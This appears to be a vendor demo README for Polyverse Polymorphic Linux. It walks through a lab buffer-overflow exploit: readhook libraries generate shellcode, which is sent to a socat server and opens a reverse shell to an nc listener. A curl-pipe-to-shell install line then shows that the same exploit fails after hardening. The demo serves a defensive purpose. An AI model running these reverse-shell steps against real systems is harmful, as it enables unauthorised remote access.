# Demonstration: Polyverse Polymorphic Linux
## Set up for a Reverse Shell
### (1) Start nc listening on port 5555 (Session-1)
```
nc -kl 5555
```
## Run a simple socat echo server under Readhook
### (2) Start with a clean alpine:3.7 (Session-2)
```
docker run --rm -it -p 8080:8080 alpine:3.7 sh
```
### (2) We'll need curl and wget
#### (2) Alpine
```
apk update && apk add curl socat wget
```
#### (2) CentOS
```
yum update -u && yum install -y curl nc socat wget
```
#### (2) Ubuntu
```
apt-get update -y && apt-get install -y curl netcat socat wget
```
### (2) Get readhook components
```
wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/v1.2.2/basehook.so
wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/v1.2.2/fullhook.so
```
### (2) Start socat with readhook in front of libc
socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD='/tmp/fullhook.so:/tmp/basehook.so' /bin/cat"
## Generate Shell-Code and Perform Exploit
### (3) Generate shell-code for the exploit (Session-3)
```
export shellCode=$(echo "xyzzxMAKELOADdocker.for.mac.localhost" | nc localhost 8080)
```
### (2) Re-start socat with minimal readhook in front of libc
```
socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/basehook.so /bin/cat"
```
### (3) Send shell-code to the OVERFLOW for a reverse shell
```
echo $shellCode | nc localhost 8080
```
### (1) Check that the overflow resulted in a remote shell
```
ls && whoami && exit
```
## Install Polyverse Polymorphic Linux
### (2) Add Polyverse as the preferred repository
```
curl https://repo.polyverse.io/install.sh | sh -s vZ2v3Bo4Kbnwj9pECrLsoGDDo
```
### (2) Replace standard packages with Polymorphic Linux
```
# (Execute the command given at the end of the previous step)
```
## Test Polyverse Polymorphic Linux
### (2) Re-start nc with minimal readhook
```
socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/basehook.so /bin/cat"
```
### (3) Try the shellCode with Polymorphic Linux
```
echo $shellCode | nc localhost 8080
```
### (1) Confirm that nobody phoned-home to the listener
### (2) Confirm that the server terminated abnormally
